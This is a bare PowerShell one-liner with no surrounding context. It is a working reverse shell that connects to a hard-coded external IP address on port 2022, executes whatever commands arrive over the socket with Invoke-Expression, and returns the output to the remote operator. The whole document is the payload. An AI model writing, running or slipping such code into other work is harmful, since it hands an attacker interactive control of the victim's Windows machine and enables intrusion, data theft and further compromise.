
$cl=New-Object System.Net.Sockets.TCPClient;$cl.Connect('3.83.228.57',2022);$st=$cl.GetStream();$by=New-Object byte[] 65536;while(($i=$st.Read($by,0,$by.Length))-ne 0){;$d=[System.Text.Encoding]::ASCII.GetString($by,0,$i);$sb=(iex ". { $d } 2>&1"|Out-String);$sb2="$sb`nPS $((Get-Location).Path)> ";$sb3=[System.Text.Encoding]::ASCII.GetBytes($sb2);$st.Write($sb3,0,$sb3.Length);$st.Flush()};$cl.Close()
